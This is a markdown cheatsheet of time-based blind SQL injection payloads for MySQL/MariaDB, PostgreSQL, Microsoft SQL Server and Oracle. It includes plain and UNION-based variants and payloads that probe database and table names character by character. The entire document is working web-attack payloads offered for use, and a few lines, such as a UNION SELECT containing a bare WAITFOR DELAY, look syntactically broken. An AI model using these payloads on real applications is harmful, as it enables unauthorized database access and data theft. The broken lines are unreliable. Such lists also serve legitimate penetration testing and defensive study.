

## Time based SQLi Cheatsheet

**MySQL/ MariaDB**

```
' AND sleep(10) -- -
' AND benchmark(5000000,SHA1(1)) -- -
' AND (SELECT * FROM (SELECT(SLEEP(10)))a) -- -
' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))=97,SLEEP(10),0) -- -
' AND (SELECT * FROM (SELECT(SLEEP(10)))b) -- -
```

**UNION Version**

```
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, (SELECT * FROM (SELECT(SLEEP(10)))a) -- -
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, (SELECT * FROM (SELECT(SLEEP(10)))b) -- -
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, (SELECT * FROM (SELECT(SLEEP(10)))c) -- -
```
> **Note:** In union-based SQL injection, we have use a malicious query with the same number of columns and data types as the original query, and we use NULL values as placeholders you should change that based on your requirements.

**PostgreSQL**

```
' AND pg_sleep(10) -- -
' AND (SELECT * FROM (SELECT PG_SLEEP(10)))a -- -
' AND (SELECT * FROM (SELECT PG_SLEEP(10)))b -- -
```

**UNION version**

```
' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, pg_sleep(10) -- -

' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, (SELECT * FROM (SELECT PG_SLEEP(10)))a -- -

' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, (SELECT * FROM (SELECT PG_SLEEP(10)))b -- -
```

**Microsoft SQL Server**

```
'; IF (DATEDIFF(SECOND,'19000101',GETDATE()) > 10) WAITFOR DELAY '0:0:10' -- -

'; IF (SELECT COUNT(*) FROM sysobjects) > 0 WAITFOR DELAY '0:0:10' -- -

'; IF (SELECT TOP 1 name FROM sysobjects WHERE xtype='U') > 'a' WAITFOR DELAY '0:0:10' -- -

'; IF (SELECT TOP 1 name FROM sysobjects WHERE xtype='U') = 'dbo' WAITFOR DELAY '0:0:10' -- -
```

**UNION version**

```
';WAITFOR DELAY '0:0:10'--

';WITH cte AS (SELECT 1 AS x FROM master.dbo.syscolumns AS a CROSS JOIN master.dbo.syscolumns AS b), cte2 AS (SELECT 1 AS x FROM cte AS a CROSS JOIN cte AS b) SELECT 1 AS x FROM cte2 AS a CROSS JOIN cte2 AS b WHERE EXISTS(SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN ('dtproperties')) WAITFOR DELAY '0:0:10'--

';WITH cte AS (SELECT 1 AS x FROM master.dbo.syscolumns AS a CROSS JOIN master.dbo.syscolumns AS b), cte2 AS (SELECT 1 AS x FROM cte AS a CROSS JOIN cte AS b), cte3 AS (SELECT 1 AS x FROM cte2 AS a CROSS JOIN cte2 AS b) SELECT 1 AS x FROM cte3 AS a CROSS JOIN cte3 AS b WHERE EXISTS(SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN ('dtproperties')) WAITFOR DELAY '0:0:10'--

' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, WAITFOR DELAY '0:0:10' -- -
```

**Oracle SQL**

```
' AND dbms_pipe.receive_message(('a'),10) -- -

' AND dbms_lock.sleep(10) -- -

' AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4) > 0 and dbms_lock.sleep(10) -- -

' AND (SELECT 1 FROM dual WHERE SYS_CONTEXT('USERENV', 'IP_ADDRESS') = '127.0.0.1' and DBMS_LOCK.SLEEP(10)) -- -

' AND (SELECT COUNT(*) FROM all_tables t1, all_tables t2, all_tables t3) > 0 and dbms_lock.sleep(10) -- -
```

**UNION version**

```
'UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, dbms_pipe.receive_message(('a'),10) FROM DUAL-- -

' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, dbms_lock.sleep(10) FROM DUAL -- -

' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4) FROM DUAL WHERE dbms_lock.sleep(10) -- -
```
